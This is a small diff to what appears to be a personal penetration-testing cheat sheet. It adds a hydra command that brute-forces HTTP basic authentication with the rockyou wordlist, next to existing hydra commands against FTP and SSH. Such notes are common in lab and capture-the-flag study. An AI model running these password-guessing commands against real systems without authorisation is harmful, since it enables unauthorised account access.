@@ -274,6 +274,10 @@ hydra -l chris -P ~/Desktop/shared/Perso-Script/wordlist/rockyou.txt ftp://10.10
 hydra -l <USER> -P <WORDLIST> <IP> ssh -t 4 -V
 ````
 
+- Basic http
+````
+hydra -l <FOUND_USERNAME -P ~/Desktop/shared/Perso-Script/wordlist/rockyou.txt -f <IP> http-get <PROTECTED_DIRECTORY>
+````
 
 ----
 
